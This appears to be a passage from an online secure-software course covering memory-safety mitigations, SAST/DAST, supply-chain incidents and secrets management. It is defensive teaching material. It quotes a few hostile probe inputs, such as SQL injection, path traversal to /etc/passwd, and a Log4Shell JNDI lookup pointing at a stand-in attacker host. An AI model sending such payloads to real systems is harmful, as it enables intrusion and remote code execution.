x: ASLR: hide the addresses Address space layout randomisation varies placement of selected mappings, such as libraries and stacks, when a process image is loaded. Support and configuration determine which mappings vary. A forked child process normally inherits the existing address space. Wrong target guesses can fail or crash; neither outcome is guaranteed for every corruption. How much it helps depends on entropy, the number of random bits. Each independent, uniformly random bit doubles the number of places a mapping can start: These are teaching examples, not asserted Linux defaults. Architecture, kernel settings and distribution policy affect actual entropy. On supported Linux systems, vm.mmap_rnd_bits controls randomisation for relevant mappings. An attacker without a leak must guess, and the average number of attempts depends on whether the base changes between attempts. If it stays fixed (forked workers inherit it, as above) and each wrong guess is ruled out, the right base is equally likely to be first, second and so on up to last: If instead every attempt meets a freshly randomised base (for example, each attempt runs a newly executed process), no attempt rules anything out. Each try is a new 1-in-N chance, and the average number of tries is N: With 28 bits the fixed-base model gives about 134 million attempts on average (268,435,457 / 2). Neither model says how long an attack takes: request rate, restart cost and monitoring decide that. Key takeaways ASLR changes selected mapping locations according to platform support and policy. Fixed unknown placement with distinct guesses differs from independent rerandomisation on every attempt. Entropy counts possible placements under a model; it does not directly measure elapsed attack duration. Further reading Linux virtual-memory sysctls fork — POSIX

t: A pointer leak reveals one known layout
sum: Subtract a known pointer offset to recover the base of that known library mapping.
x: ASLR can make a useful address hard to predict while an information leak makes it calculable. The important question is which build and which mapping the disclosed pointer identifies. Two caveats make ASLR weaker than the numbers suggest: Leaks can weaken ASLR. A pointer into a known library build at a known offset reveals that mapping base. It does not automatically reveal unrelated mappings or unknown builds. For the ordinary fixed-layout library mapping in this example, the relevant symbols have known offsets from the mapping base. A leak that identifies that build and target can therefore reveal the base. Some objects are allocated separately or functions are resolved dynamically, so a symbol name alone does not prove that its actual run-time address has that simple relationship. With illustrative hexadecimal numbers: In this fixed-layout model, ASLR moves the base rather than the relative offsets, which is why that particular leak identifies the mapping. The illustrative base ends in three hexadecimal zeros, consistent with a 4 KiB page boundary: 4,096 bytes. Actual page sizes and mapping alignments depend on the platform. Not every mapping is randomised. Conventional non-PIE ELF executables have fixed main-code addresses. PIE permits random placement when the loader and OS enable it; compiler flags alone are not proof of effective randomisation. Linux can randomise its kernel base when KASLR is supported and enabled. A known-offset kernel pointer leak can weaken that protection. Key takeaways Subtract a known pointer offset to recover the base of that known library mapping. Knowing one mapping does not reveal every other mapping or disable NX and canaries. PIE enables random placement of main code when the loader and OS actually apply it. Further reading Linux virtual-memory sysctls ELF program format — Linux manual Instrumentation options — GCC

sum: Full RELRO combines relocation-region protection with eager binding in a supported ELF layout.
x: RELRO and FORTIFY_SOURCE Two more toolchain hardening features are common on Linux: RELRO makes a designated ELF relocation region read-only after relocation. In a conventional supported ELF toolchain, full RELRO (-Wl,-z,relro,-z,now) also resolves lazy function bindings at load time so the GOT can be protected. Later dlopen loads have their own relocations. This does not protect every function pointer in a program. _FORTIFY_SOURCE adds compile-time diagnostics and run-time checks to supported library calls where object-size information is available. Level 3 uses dynamic object-size information and requires a compatible compiler/libc; glibc enables these wrappers only with optimisation. Unknown sizes and unsupported operations can remain unchecked. An illustrative GNU/Linux ELF build fragment follows. It requires toolchain support for level-3 fortification; the CET-related flag is for supported x86 targets. Check platform documentation and the resulting binary/runtime configuration. Accepting a compiler flag does not prove that hardware enforcement is active. Key takeaways Full RELRO combines relocation-region protection with eager binding in a supported ELF layout. Fortification covers supported calls when object-size information and toolchain requirements are satisfied. Check the generated binary and runtime configuration; accepted flags alone do not prove enforcement. Further reading Source fortification — glibc Compiler hardening guide — OpenSSF GNU linker options

t: Different checks for calls and returns
sum: Forward-edge schemes restrict covered indirect calls or jumps with policies permitting different target sets.
x: Control-flow integrity Control-flow integrity constrains allowed control transfers. Different schemes cover different indirect calls, jumps or returns; they do not all check every transfer or enforce the same policy. Forward edges: indirect calls An indirect call such as fp() obtains its target at run time. C++ virtual dispatch commonly also uses indirect calls, though a compiler knowing the target can replace dynamic dispatch with a direct call. A forward-edge check restricts the covered transfer to its permitted target set. Clang CFI includes type-based indirect-call and virtual-call checks. Its -fsanitize=cfi family requires the documented LTO and visibility setup; that flag alone is not a complete build recipe. Microsoft CFG validates instrumented indirect calls against allowed targets; it is not a complete type-based policy. Intel IBT and Arm BTI constrain relevant indirect branches to suitable landing pads when enforcement is enabled. Landing-pad validation is coarser than checking the intended function type. Backward edges: returns A shadow stack keeps protected return-address copies. With x86 CET shadow-stack enforcement, calls update the two stacks and returns check agreement. Linux user-space use requires supporting CPU, kernel, runtime and enablement; kernel availability alone does not protect every application. Pointer authentication can protect selected Arm pointers with a keyed authentication code, incorporating contextual information. It authenticates rather than encrypts the pointer, and is not a general memory-safety check. Code generation, authentication policy and hardware support determine which pointers are protected. The permitted-target set depends on the CFI policy. Type-based schemes may still permit an unintended same-type target; landing-pad schemes can permit a broader set. Shadow stacks protect returns by a different check, so a same-type target is not itself a shadow-stack bypass. Key takeaways Forward-edge schemes restrict covered indirect calls or jumps with policies permitting different target sets. A shadow stack checks returns against protected copies when enabled for that code. Pointer authentication authenticates selected pointers; it does not encrypt them or establish general memory safety. Further reading Control-flow integrity — Clang CET shadow stacks — Linux Arm pointer authentication — Linux Control Flow Guard — Microsoft

sum: MTE checks suitably configured tagged accesses at sixteen-byte granularity.
x: Memory tagging Arm MTE associates four-bit allocation tags with 16-byte granules of suitably configured memory and compares them with pointer tags on checked accesses. Software must arrange tagging and retagging; hardware does not infer every object lifetime. Four bits give 16 possible tags. Suppose a freed granule is retagged by an explicitly uniform, independent choice among all 16, and a stale pointer keeps its old tag: That probability describes one comparison in this simple model, not a real exploit success rate. Actual allocator policies, unchecked accesses and same-granule overflows change what is caught. In synchronous mode a mismatch is reported at the access; asynchronous mode can allow execution to continue before reporting. Allocator hardening also narrows some failure modes. glibc safe-linking encodes selected singly linked free-list pointers; it does not prevent all heap corruption. Chrome BackupRefPtr, one MiraclePtr implementation, quarantines eligible allocations while tracked raw_ptr references remain. Untracked raw aliases and unsupported allocations are outside that guarantee. Summary table Mitigation Checks or restricts Remaining risk --------- Canary Some protected stack overwrites Leak, non-linear write DEP/NX Fetch from NX pages Code reuse ASLR Predicting selected addresses Info leak Full RELRO Writes to the protected GOT Other pointers Type-based forward CFI Invalid indirect-call targets Unintended allowed target Shadow stack Covered modified returns Unprotected code or disabled enforcement MTE Some invalid tagged accesses Tag match or unchecked boundary Defence in depth Combine protections and fix the source bug. Data-only corruption, information disclosure and failures outside what the enabled protections cover remain possible. Extra vulnerabilities are sometimes needed to turn a bug into an attack, but a mitigation does not force every attacker to find another bug. Content omitted after review Universal ASLR defaults, platform-wide deployment rates, fixed exploit costs and guaranteed crash or prevention rates are omitted because this review did not establish the necessary versioned measurements. MTE and CET hardware enforcement were not exercised in this review. Key takeaways MTE checks suitably configured tagged accesses at sixteen-byte granularity. A one-in-sixteen match follows only from the explicitly uniform independent retagging model. Tagging and allocator hardening restrict some failure modes; combine supported defences and repair source bugs. Further reading Memory Tagging Extension — Linux Memory Tagging Extension — Android BackupRefPtr — Chromium

sum: Match security activities to each stage of development and distinguish application requirements from process maturity.
x: Many vulnerabilities arise from ordinary bugs (a string glued into a SQL query, a missing permission check, a debug endpoint left on) that nobody looked for at the right moment. The secure software development life cycle (secure SDLC) is the idea that security is a property of how you build software, not a test you run the week before launch. Consider an illustrative late-review process: developers build for six months, a security team pen-tests for two weeks, finds forty issues, and the release slips or ships anyway. The secure SDLC spreads that work across every phase, using automation and human review, aiming to reduce the cost and exposure of late discovery. Why "shift left" Shifting left means moving security checks earlier in the timeline, towards the developer's keyboard. The reasons are practical: Context. A developer fixing a SAST finding on their own pull request remembers the code. Six months later, someone else has to rediscover it. Blast radius. A flaw in a design document costs an edit. The same flaw shipped to 10,000 customers costs a patch, a disclosure and perhaps a breach. Feedback loops. Developers learn from fast feedback. Timely actionable feedback can be easier to apply than a delayed report; either format can still teach. About the "100× cheaper" statistic You will often see a claim that a bug costs 100 times more to fix in production than in design, attributed to IBM. The original source is hard to trace and the exact multiplier is not well supported. Earlier discovery can avoid downstream rework, but actual cost depends on the defect and project. No universal multiplier is asserted here. The phases and their security activities Phase Security activity ------ Requirements Security requirements, abuse cases Design Threat modelling, design review Build Secure coding, review, SAST, SCA Test DAST, fuzzing, pen testing Release Signing, SBOM, config review Operate Monitoring, patching, incident response A few of these deserve a word: Abuse cases are user stories written from the attacker's side: "As an attacker, I want to reset another user's password by guessing the token." They turn vague worries into testable requirements. Threat modelling (STRIDE, attack trees; see the fundamentals module) happens at design time, when changing direction is cheap. Security requirements can be taken from a checklist such as the OWASP Application Security Verification Standard (ASVS), which lists concrete, testable controls at three levels of rigour. You do not have to invent the process. Microsoft's Security Development Lifecycle (made mandatory internally in 2004, after Bill Gates's 2002 "Trustworthy Computing" memo) is one prominent large-scale example; no claim of historical priority is made here. The NIST Secure Software Development Framework (SP 800-218) recommends practices; OWASP SAMM provides an explicit maturity model for assessing them. Key takeaways Place security work throughout requirements, design, implementation, testing, release and operation. Earlier discovery preserves context and can avoid rework, without a universal cost multiplier. ASVS describes application controls; SAMM describes the maturity of organisational practices. Further reading NIST Secure Software Development Framework OWASP SAMM model OWASP ASVS Microsoft SDL history

t: Static analysis and SQL data flow
sum: Trace untrusted values into SQL text and see why parameter binding changes the risk.
x: A static scanner examines code without executing it. For an injection finding, the important question is which argument contains untrusted data: SQL grammar and bound parameter values have different roles. This unit follows the same input through unsafe string construction and a parameterised query. SAST: reading the code Static application security testing (SAST) analyses source code (or bytecode) without running it. Tools include Semgrep, CodeQL, SonarQube and, for Python, Bandit. The simplest SAST tools match patterns: "flag any call to eval". Better tools do taint analysis. They track data from taint sources (things an attacker controls) to taint sinks (dangerous operations), and raise an alert if tainted data reaches a sink without passing through a sanitising function (one that makes data safe for that sink, such as escaping or validation). Here is vulnerable code that a suitably configured taint rule can flag: The fix is a parameterised query, which keeps the data separate from the SQL grammar entirely: Bandit's B608 documentation illustrates a finding in this form; exact output and confidence depend on code shape and tool version: Note the "Confidence: Low". Bandit only sees that a string containing SQL keywords was built by formatting; it does not know whether name came from a user. A taint-tracking tool such as CodeQL, or a Semgrep taint rule, can be more precise: This local teaching rule focuses the sink on the query argument, so bound data in a separate parameter argument is not expected to create this SQL-text finding. Its positive and negative examples must be checked with the installed Semgrep version; a passing fixture does not establish complete coverage of Flask input or every SQL API. Strengths and limits of SAST Runs early and fast, on every pull request, before anything is deployed. Identifies code locations, helping developers investigate findings; modelled paths and reported locations still need review. Covers code paths tests never reach, by reasoning about paths without executing them, but practical analyses approximate behavior and may miss paths or flows. False positives. It cannot always tell whether a value is really attacker-controlled or already validated. Noisy tools get ignored. False negatives. It struggles with things that are not visible in code: misconfigured servers, logic flaws ("a user can approve their own expense claim"), or data flowing through reflection, queues and other services. Key takeaways A taint model tracks sources, propagation, sinks and context-specific sanitisers. Parameter binding keeps input separate from the SQL grammar. Static findings depend on the rule and program model; both false positives and missed flows remain possible. Further reading Semgrep taint analysis Bandit B608 SQL construction Python SQLite parameter binding

sum: Choose complementary tests for running configuration, vulnerable libraries and unusual parser inputs.
x: A single scanner cannot establish that an application is secure. Static analysis from the previous unit sees selected code patterns; a running deployment, third-party components and a parser fed unusual inputs provide different evidence. Match the technique to the failure you need to find. DAST: attacking the running app Dynamic application security testing (DAST) treats the application as a black box. It crawls a running instance, then sends malicious inputs (' OR 1=1--, <script>,../../etc/passwd) and inspects the responses. OWASP ZAP and Burp Suite are the best-known tools. DAST can observe runtime manifestations of problems such as: Missing security headers (Content-Security-Policy, Strict-Transport-Security). Cookies without Secure or HttpOnly. Verbose error pages that leak stack traces. Injection flaws that are actually exploitable, end to end. Its limits mirror SAST's. It needs a deployed environment, so it runs later. It only tests what it can reach, so pages behind logins, multi-step forms or single-page-app routing are often missed unless you configure authentication and seed URLs. And when it finds a bug, it usually reports the request/endpoint rather than a reliable source-code location, unless integrated instrumentation provides one. SCA, IAST and fuzzing Three more techniques complete the picture. Software composition analysis (SCA) checks your dependencies against databases of known vulnerabilities. Tools include Dependabot, pip-audit, Snyk and OWASP Dependency-Check. The supply-chain units cover dependency inventory and selection in depth. Interactive testing (IAST) instruments the running app, so when DAST or a functional test sends a payload, an agent inside the process sees exactly which line it reached. It can connect exercised requests to internal code locations, subject to instrumentation, supported runtimes and test coverage. Fuzzing throws huge numbers of random or mutated inputs at a parser and watches for crashes. Coverage-guided fuzzing with suitable memory-error detectors is particularly useful for finding memory-safety bugs. Heartbleed (2014, OpenSSL) was found independently by a Google engineer reviewing code and by the security firm Codenomicon using its own fuzz-testing tools. Google's OSS-Fuzz has since found thousands of vulnerabilities in open-source projects. Technique Needs Best at --------- SAST Source Injection, unsafe APIs DAST Running app Config, headers, real exploits SCA Dependency list Known CVEs in libraries Fuzzing Harness Parser and memory bugs Log4Shell and the limits of SAST In December 2021, Log4Shell (CVE-2021-44228) could enable remote code execution in affected Log4j Core configurations when attacker-controlled input such as ${jndi:ldap://evil.example/a} reached a vulnerable lookup path. A scan limited to application code and lacking relevant dependency/flow models might miss the problem: calling log.info(userAgent) is normal. The flaw lived in the Log4j library, in JNDI lookup support added in July 2013 (Apache issue LOG4J2-313). Teams with an accurate dependency inventory could identify candidate exposure more directly than those reconstructing one during the incident. Comparative hour/week claims about how quickly teams responded are omitted because this review did not obtain supporting incident data. Key takeaways DAST sees responses from a running target, subject to authentication and crawl coverage. SCA locates known dependency advisories; IAST adds runtime instrumentation. Coverage-guided fuzzing exercises unusual inputs and is useful with memory-error detectors. Normal application logging calls can reach a vulnerable dependency such as historical Log4j Core. Further reading ZAP scanner documentation OSS-Fuzz Apache Log4j advisories Heartbleed discovery Apache JNDI feature issue, July 2013

sum: Build actionable pipeline gates while retaining human review for business rules and design.
x: Security checks help when someone can act on their results. This unit combines static, dynamic, dependency and secret checks into a practical pipeline, then considers how to handle an existing backlog and business rules that generic tools do not know. Putting it in a pipeline Some practical rules: Use risk-based build gates. Baseline and triage existing findings, gate actionable new issues, and escalate severe existing vulnerabilities rather than exempting them merely because they are old. A gate that fails on 3,000 legacy warnings gets switched off. Tune rules. Disable checks that never find anything real in your codebase; add custom rules for your own dangerous patterns. Put results where developers work: as PR comments rather than in a separate dashboard nobody opens. Use security champions: one developer per team with extra training, who triages findings and is the first point of contact. This spreads trained first-line support across teams; it does not eliminate specialist review or guarantee a particular improvement. Keep humans in the loop. Code review and threat modelling find logic and design flaws that generic scanners may miss without the relevant security requirements and models. Common pitfalls Tools as a checkbox. Running a scanner for compliance and never reading the output adds cost and no security. Treating "no findings" as "secure". Each tool has blind spots; absence of evidence is not evidence of absence. Security as gatekeeper. If the security team is a bottleneck that says "no", teams route around it. Paved roads (secure defaults, approved libraries, templates) reduce avoidable friction and can complement risk-based gates. Skipping design. A generic scanner may miss a non-expiring password-reset token; custom rules, framework checks and targeted dynamic tests can detect some such flaws. Key takeaways Baseline and triage an existing backlog while escalating severe existing issues. Gate actionable new findings, tune rules and put results where developers work. Human review identifies business requirements that can become custom checks and targeted tests. Choose initial automation to match the stated risks rather than treating package counts as a risk measurement. Further reading NIST SSDF OWASP Security Champions Guide Semgrep documentation

t: Supply chains and the SolarWinds build
sum: See how a clean repository can produce a signed malicious build.
x: Applications can include many transitive dependencies beyond the ones developers select directly; actual counts vary by project. Add the compiler, the CI system, the base container image and the build scripts, and the code you wrote is a small island in a sea of code you trust without reading. Supply-chain attacks target that sea. Instead of breaking into one hardened company, the attacker compromises something many companies consume, and lets the victims install the payload themselves. The attacker gets reach, and the payload arrives signed, trusted and through the front door. Where the chain can break Each arrow is a trust relationship. Three real incidents show three different links failing. SolarWinds: the build system (2020) SolarWinds Orion is network-monitoring software used by thousands of large organisations, including US government departments. Attackers, later attributed by the US and UK governments to Russia's foreign intelligence service (SVR), got into SolarWinds' build environment. They did not commit malicious code to the repository, where developers might notice it. Instead they planted a tool that CrowdStrike later named SUNSPOT on the build server. It watched for the MsBuild.exe build-engine process building Orion, swapped one source file (InventoryManager.cs) for a backdoored version for the duration of the build, then put the original back. The result, SUNBURST, was compiled into a legitimate DLL, signed with SolarWinds' own code-signing certificate, and shipped in Orion updates from around March to June 2020. SolarWinds initially estimated fewer than 18,000 customers might have installed affected versions. The backdoor waited roughly two weeks before calling home, and the attackers then picked a much smaller set of high-value targets for follow-on intrusion. Lessons: Code signing binds content to a signing key; it does not prove the actual builder or that the content is safe. The signature was genuine. Source review is not enough. The source in git was clean; the build was not. The build system is production infrastructure and needs production-grade security. Key takeaways Source, builder, registry and consumer are separate trust boundaries. SUNSPOT changed source during the Orion build; SUNBURST arrived in signed updates. A valid signature binds content to a key and does not establish that the build or software is safe. Further reading CrowdStrike SUNSPOT analysis Mandiant SUNBURST analysis UK attribution of SolarWinds compromise

sum: Distinguish trusted source review from checking what a release archive actually builds.
x: A release archive can contain files absent from the corresponding repository snapshot. The 2024 xz-utils backdoor shows how maintainer trust, build-time conditions and binary test fixtures can combine. The historical conditions below describe affected releases, not every Linux system or SSH server. xz-utils: the maintainer (2024) xz-utils is a compression library used by many Linux distributions. Its maintainer, Lasse Collin, ran it as an unpaid hobby project. From late 2021 a contributor calling themselves "Jia Tan" sent helpful, ordinary patches. In 2022 several accounts, described in the linked historical reconstruction as suspected sock puppets, pressured Collin on the mailing list, complaining the project was slow and that he should hand over maintenance. Jia Tan gained commit access in late 2022 and was making releases by 2023. In February and March 2024 Jia Tan released versions 5.6.0 and 5.6.1 containing a backdoor (CVE-2024-3094, CVSS 10.0, the maximum on CVSS's 0.0–10.0 severity scale). It was hidden with real care: The payload sat in two binary "test" files (bad-3-corrupt_lzma2.xz, good-large_compressed.lzma), whose encoded contents require additional inspection. The trigger was a modified build-to-host.m4 that appeared only in the release tarballs, never in git. It activated only when building Debian or RPM packages on x86-64 Linux. Several distributions apply distribution-specific code patches to OpenSSH's sshd that links it to libsystemd, which links liblzma. The backdoor used that path to hook the server's RSA key verification, so the holder of the attacker's private key could run commands on any affected machine via SSH. It was disclosed after a developer investigated unexpected behavior. Andres Freund, a PostgreSQL developer at Microsoft, noticed SSH logins on Debian unstable using unusual CPU (a failed login went from about 0.3 s to 0.8 s) and Valgrind errors, investigated, and disclosed it on 29 March 2024. The backdoored versions had reached Fedora Rawhide, Fedora 40 beta and Debian unstable and testing, primarily in prerelease distributions at disclosure; exact affected distributions and build conditions must be checked against their advisories. Lessons: The release artefact must match the source. For the disclosed release-only trigger, building from the corresponding git source bypassed that trigger; this is not a general guarantee that git contents are safe. Maintainer burnout is a security problem. Critical infrastructure maintained by one tired volunteer is a soft target for social engineering. Binary blobs need different review techniques. Their purpose, generation process and decoded contents can be examined; they are not inherently unreviewable. Key takeaways The disclosed trigger was shipped in release tarballs rather than the git source. The SSH compromise depended on specific distribution linking and build conditions. Investigating unexpected latency and tool errors exposed the backdoor. Review release inputs and maintainer handovers, including how binary fixtures are generated. Further reading Andres Freund disclosure XZ project backdoor information Historical mailing-list timeline

sum: Separate a vulnerable dependency from a malicious package and understand index confusion.
x: Supply-chain risk includes both deliberate upstream tampering and ordinary bugs in trusted dependencies. Log4Shell illustrates the inventory problem; package-ecosystem attacks illustrate how names, credentials and version selection can direct a build to attacker-controlled code. Log4Shell: the vulnerable dependency (2021) Not every supply-chain incident involves an attacker in the chain. Log4Shell (CVE-2021-44228, December 2021, CVSS 10.0) was a vulnerability in Log4j Core, a widely used Java logging component; it was not itself evidence of a malicious upstream implant. Log4j supported lookups: ${...} expressions inside log messages that were expanded at log time. One lookup was JNDI, which can fetch and load a Java object from a remote LDAP server. In vulnerable lookup paths and runtime configurations, attacker-controlled logged input could trigger a remote lookup, for example: The vulnerable path could contact an attacker LDAP endpoint and enable code execution, depending on runtime and reachable exploitation paths. The original advisory affected Log4j Core 2.0-beta9 through 2.14.1; log4j-api alone and Log4j 1.x are different cases. A major defensive challenge was the question "where do we run Log4j?" It could be a transitive dependency, pulled in by a framework, inside a fat JAR, inside a vendor appliance. Fixes also came in waves: 2.15.0, then 2.16.0 and 2.17.0 for follow-up CVEs, then 2.17.1, so teams had to find everything more than once. Attacks on the package ecosystem Beyond the three incidents introduced so far, recognise these patterns: Typosquatting: publishing reqeusts or python-dateutils and waiting for typos. Removal counts vary; the risk is selecting an attacker-controlled lookalike name. Account takeover: stealing a maintainer's registry credentials and publishing a malicious version of a real package (the npm package ua-parser-js in 2021 shipped a cryptominer this way). Handover: offering to maintain an abandoned package. In 2018 the npm event-stream package was handed to a new maintainer who added a dependency that targeted one Bitcoin wallet app. Dependency confusion: in his February 2021 account, Alex Birsan reported successful tests at more than 35 organisations, including Apple, Microsoft and PayPal. His research used exposed internal package names and public packages with matching names; a higher public version was one demonstrated selection route, especially with pip. Some installations occurred on developer machines as well as build servers. Why dependency confusion works with pip With pip install --extra-index-url https://pypi.internal..., pip gives indexes no priority and selects the best compatible candidate under its version constraints and resolver rules. If acme-auth is 1.4 internally and an attacker publishes acme-auth 99.0 on PyPI, pip can choose 99.0 when both candidates are compatible and no other constraints or installed-state decisions change selection. Use a single --index-url pointing at a proxy that serves your internal names exclusively, and pin hashes. Key takeaways Log4Shell was a vulnerability in affected Log4j Core configurations, rather than proof of a malicious implant. Typosquatting, account takeover and maintainer handover attack different parts of package trust. pip does not prioritise the internal index merely because it was configured alongside a public one. Use namespace and index policies that keep internal names under your control. Further reading Apache Log4j advisories pip package selection and index warning event-stream incident analysis by npm ua-parser-js maintainer incident report Birsan’s original dependency-confusion account

sum: Understand what an enforced package hash checks and what it cannot prove.
x: Version selection and byte identity are different checks. A lockfile records intended dependency choices; an enforced artifact hash checks whether the downloaded bytes are one of the approved files. Neither establishes that the approved package is harmless. Lockfiles and artifact hashes A lockfile (poetry.lock, package-lock.json, requirements.txt from pip-compile) records resolved dependency choices; complete reproducibility also depends on platform markers, artifacts, installer behavior and how the lockfile is enforced. With hashes, the installer also refuses an artefact whose content differs from what you reviewed: For each downloaded distribution, pip requires a match with an allowed digest for that requirement; several allowed hashes can cover different platform files. A cryptographic hash maps bytes to a fixed-length fingerprint. Changed bytes overwhelmingly produce a different SHA-256 digest, but collisions are mathematically possible: For example, if someone replaces requests-2.32.3 on a mirror with a modified copy, its digest will overwhelmingly differ from the recorded full digest (shown here only as 70761c...) and pip refuses it. A match provides strong computational evidence of approved bytes, subject to the hash function’s collision resistance. If the file you recorded was already malicious, its H(f) matches perfectly. Key takeaways Exact versions and artifact hashes make updates deliberate. Hash checking tests approved bytes, rather than the safety of those bytes. Platform markers, artifacts and installer behaviour still affect reproducibility. Further reading pip secure installs NIST Secure Hash Standard

sum: Use a component inventory to find candidate deployments without confusing a name match with a vulnerability verdict.
x: When a dependency advisory appears, responders first need to locate the software that may include the component. A per-release inventory narrows that search, provided its generation scope and metadata are reliable. The small example below reports candidates; it deliberately does not implement a vulnerability resolver. Component inventory A software bill of materials (SBOM) is a machine-readable component inventory whose completeness depends on generation scope and metadata quality, in SPDX or CycloneDX format. US Executive Order 14028 (May 2021) pushed SBOMs into federal procurement. With SBOMs stored per release, "where do we run Log4j?" becomes a query: This simplified CycloneDX-style inventory lists candidate components, not vulnerability verdicts. Match full package identity and version against the applicable advisory, including backport branches and prereleases; then assess configuration/reachability. A blanket <2.17.1 check would misclassify backported fixes and later advisories. Content gap Universal timings for answering inventory questions and relative incident-frequency claims are omitted because no comparable measurement dataset was available. Key takeaways An SBOM records components and their metadata for a particular release. A component-name match is a candidate, not proof of an affected version or reachable exploit. Advisory ranges, package identity, backports and runtime configuration still matter. Further reading CISA SBOM CycloneDX specification Apache Log4j advisories

sum: Apply provenance and signer policies while keeping dependencies patched.
x: An inventory says what was included. Provenance describes how an artifact was produced, and a verified signature can authenticate an expected signing identity. Each needs a consumer policy and has limits: authentic evidence can still describe a malicious input or a vulnerable component. Know it hasn't been tampered with: provenance and SLSA SLSA ("salsa", Supply-chain Levels for Software Artifacts) is an OpenSSF framework. Its Build track has levels: Level Requirement Intended benefit --------- L1 Provenance exists Traceability; no intrinsic tamper resistance L2 Authenticated provenance, hosted build Detect substitution when provenance is verified against policy L3 Hardened, isolated build Stronger resistance to cross-build influence and provenance forgery Provenance records how an artifact was produced; authentication/signing depends on the required level and delivery mechanism. A statement may say: "artefact with hash X was built from commit Y of repo Z by builder B with these parameters". A consumer can verify that the package came from the expected source and builder. SLSA v1.2 adds a Source track covering how code gets into the repository. How the incidents map: SolarWinds was tampering during the build, the threat Build L3 targets: stronger isolation and protected provenance generation. The build platform remains trusted; an arbitrary compromise of that trusted platform is not automatically excluded by a level label. xz-utils shipped a tarball that did not match the git source. Provenance tied to a reviewed source policy, or independent reproducible builds with known inputs, can expose unexpected source-to-artifact differences. Provenance alone can truthfully describe a malicious tarball build. But SLSA would not stop a trusted maintainer committing malicious code; that needs review, which is why the binary test files mattered. Log4Shell was a genuine bug; SLSA provenance does not diagnose that vulnerability; SBOMs and SCA help locate candidate affected components. Signing Sigstore (with its cosign tool) supports CI signing artefacts with short-lived certificates tied to an OIDC identity ("built by this GitHub Actions workflow in this repo"), and records signatures in a public transparency log. npm and PyPI now support provenance attestations based on this. Remember SolarWinds: signing tells you who, so verify the identity is the one you expect. Choose and limit dependencies Prefer fewer, well-maintained dependencies. OpenSSF Scorecard rates projects on branch protection, code review, signed releases and more. Let Dependabot or Renovate raise update PRs, but weigh observation delays for untrusted new releases against the urgency of security fixes; no fixed waiting period guarantees safety. Run SCA (pip-audit, npm audit, Dependabot alerts) in CI. Use private registries or proxies, and reserve your internal package names (or use npm scopes such as @acme/). Trade-off: pinning versus patching Strict pinning with enforced artifact hashes avoids automatically selecting a different new release, but leaves you on vulnerable old versions unless something prompts an update. Pin and automate updates, so changes are deliberate, reviewed and frequent. Key takeaways SLSA Build levels strengthen provenance and build isolation within their threat model. Check the expected source, builder and signing identity; a valid signature alone is insufficient. Source review, reproducible builds and component analysis complement provenance. Pin packages and hashes, then review automated updates so pinning does not freeze known vulnerabilities forever. Further reading SLSA v1.2 Sigstore overview Reproducible build definition OpenSSF Scorecard checks

sum: Trace how repository history, process environments and CI compromise expose reusable credentials.
x: A secret is sensitive material whose confidentiality helps protect access or cryptographic operations: a database password, an AWS access key, a Stripe API key, a TLS private key, an OAuth token, a signing key. A usable leaked bearer credential may grant access without exploiting another software flaw. An access-key ID alone, expired token or key requiring additional factors is not necessarily sufficient. Secrets are hard because software needs them to work. Your service must present the database password to connect, so it has to be somewhere the service can read. The goal of secrets management is to make that "somewhere" as small, as short-lived and as well-watched as possible. How secrets leak Hard-coding and git The classic mistake: Once committed, the secret remains in reachable repository history until that history is rewritten; copies may persist in clones, forks, caches and backups. Deleting the line in the next commit changes nothing: git log -p still shows it. Rewriting history (git filter-repo) helps hygiene, but you cannot recall the copies already made. Leaked means rotate The only reliable response to a secret that reached a repository, a log or a chat channel is to revoke it and issue a new one, then check for misuse. Public GitHub is scanned by bots continuously; exposed credentials can be copied before you notice. A universal time-to-abuse estimate is omitted because this review did not obtain a representative measurement dataset. Private repositories are not safe either. In 2016 attackers got into a private GitHub repository used by Uber engineers, found an AWS access key, and used it to download files from S3 containing names, emails and phone numbers of tens of millions of riders and drivers. Uber then paid the attackers $100,000 through its bug-bounty programme and did not disclose the breach for a year, which became a scandal and an FTC case of its own. Environment variables The Twelve-Factor App advice to keep config in environment variables is a big improvement over hard-coding: secrets stay out of code. But environment variables leak in ways people forget: Child processes normally inherit them unless explicitly passed a filtered environment, including any shell command or third-party binary you spawn. Crash reporters and debug pages often dump the environment (framework debug pages, error-tracking SDKs). CI logs: a stray env or set -x prints them. CI masking is best effort and platform-dependent; transformed or unregistered values may escape masking. Process inspection: on Linux, access to /proc/<pid>/environ is governed by ptrace-style credential/capability checks and additional system policy; matching a UID is not an unconditional permission guarantee. Container metadata: docker inspect shows environment variables passed at run time. Environment variables are acceptable for injecting a secret at start-up, but they are not a store, and they do nothing about rotation or auditing. CI/CD systems CI holds the keys to production: deploy credentials, registry tokens, signing keys. That makes it a prime target. Codecov (2021): attackers modified Codecov's Bash Uploader script, which thousands of CI pipelines downloaded and ran on every build, to send the pipeline's environment variables to an attacker's server. It ran for about two months before a customer noticed the script's checksum didn't match. CircleCI (January 2023): malware on an engineer's laptop stole a 2FA-backed SSO session cookie. With that engineer's access, the attacker exfiltrated customers' stored environment variables, tokens and keys. They were encrypted at rest, but the attacker also extracted the encryption keys from a running process. CircleCI told every customer to rotate every secret stored on the platform. Both show the same pattern: long-lived secrets stored in one place become a single, very valuable target. Key takeaways Deleting a secret from the latest commit does not remove history or existing copies. Environment injection avoids literals in source but remains exposed to authorised inspection, children and diagnostics. CI systems holding many long-lived credentials are valuable targets. Revoke exposed credentials, replace them safely and investigate misuse. Further reading OWASP secrets management GitHub removing sensitive data FTC Uber 2016 breach account CircleCI incident report Codecov incident report

sum: Fetch a scoped secret with platform identity and understand its operational limits.
x: A secret store reduces scattered copies and provides controlled retrieval. The application must still authenticate to it, protect the returned plaintext and manage availability. Platform identity can avoid embedding a long-lived bootstrap key, provided the workload and credential-provider configuration are correct. Secret stores A secret store (HashiCorp Vault, AWS Secrets Manager, Google Secret Manager, Azure Key Vault) centralises secrets and gives you: Encryption at rest, typically with envelope encryption under a KMS or HSM key. Access control per secret: the billing service can read billing/db and nothing else. Audit facilities for secret accesses, subject to configuration, retention and service capabilities; cached application reads are not new store accesses. Versioning and rotation support. The application authenticates to the store as itself (using its cloud role or Kubernetes service account), then fetches what it needs at runtime: Notice there is no key in this code. boto3 uses its credential provider chain; in a correctly configured role-based workload it obtains temporary role credentials, but explicit/environment/profile credentials can take precedence. The bootstrap problem ("what secret do I use to get my secrets?") is solved by platform identity: the cloud vouches for the workload. Kubernetes Secrets are not encrypted by default A Kubernetes Secret is base64-encoded, which is an encoding, not encryption. Enable encryption at rest for etcd (ideally with a KMS provider) and restrict RBAC. Encryption protects stored data; an authorised API caller with get secrets can still retrieve the plaintext. 